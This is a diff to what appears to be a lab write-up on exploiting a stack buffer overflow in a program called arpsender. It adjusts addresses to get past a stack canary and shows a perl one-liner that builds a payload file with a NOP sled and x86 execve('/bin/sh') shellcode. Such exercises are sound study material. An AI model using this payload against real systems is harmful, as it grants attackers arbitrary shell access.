@@ -183,8 +183,11 @@ $ ./arpsender packet.txt
 ...
 ```
 Something has changed in the memory layout but we know that we are writing the canary value. Let's try to increment the addresses `16 bytes = 10(hex)` to pass the cannary and hopefully reach the `$eip`:
-`0xbffff4fc -> 0xbffff50c`
-`0xbffff469 -> 0xbffff479`
+```
+0xbffff4fc -> 0xbffff50c
+0xbffff469 -> 0xbffff479
+```
+Rewrite the `packet.txt` with the shifted addresses
 ```
 perl -e 'print "\x79\xf4\xff\xbf\x87" ."\x90\x90\x90" . "\x90" x86 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"."\x0c\xf5\xff\xbf"' >packet.txt
 ```
